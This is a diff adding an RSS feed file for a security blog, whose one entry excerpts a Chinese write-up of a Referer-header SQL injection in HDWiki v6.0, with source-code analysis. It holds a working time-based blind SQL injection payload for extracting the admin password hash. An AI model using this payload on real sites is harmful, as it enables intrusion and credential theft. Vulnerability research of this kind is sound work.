@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>HDWiki on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/hdwiki/</link>
+    <description>Recent content in HDWiki on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 22 Jul 2018 17:13:30 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/hdwiki/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HDWiki v6.0最新版referer注入漏洞(每周一洞)</title>
+      <link>https://getshe11.com/posts/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</link>
+      <pubDate>Sun, 22 Jul 2018 17:13:30 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</guid>
+      <description>0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
+0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
+0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
+2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
+3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
+0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&amp;gt;add_referer();这里。
+function dologin(){ $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;1&amp;#39;); if(!isset($this-&amp;gt;post[&amp;#39;submit&amp;#39;])){ $this-&amp;gt;view-&amp;gt;assign(&amp;#39;checkcode&amp;#39;,isset($this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;])?$this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;]:0); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;add_referer(); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;2&amp;#39;); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_client(&amp;#39;login&amp;#39;); if (!isset($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;] = 3;} if (!isset($this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;] = 15;} $loginTip2 = str_replace(array(&amp;#39;3&amp;#39;,&amp;#39;15&amp;#39;),array($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;],$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]),$this-&amp;gt;view-&amp;gt;lang[&amp;#39;loginTip2&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_min_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_max_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;loginTip2&amp;#39;,$loginTip2); //$this-&amp;gt;view-&amp;gt;display(&amp;#39;login&amp;#39;); 	$_ENV[&amp;#39;block&amp;#39;]-&amp;gt;view(&amp;#39;login&amp;#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
+function add_referer(){ if($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]){ $this-&amp;gt;db-&amp;gt;query(&amp;#34;UPDATE &amp;#34;.DB_TABLEPRE.&amp;#34;session SET referer =&amp;#39;&amp;#34;.string::haddslashes($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]).&amp;#34;&amp;#39; WHERE sid=&amp;#39;&amp;#34;.base::hgetcookie(&amp;#39;sid&amp;#39;).&amp;#34;&amp;#39;&amp;#34;); } } 我们进入haddslashes()函数，在lib\string.</description>
+    </item>
+    
+  </channel>
+</rss>
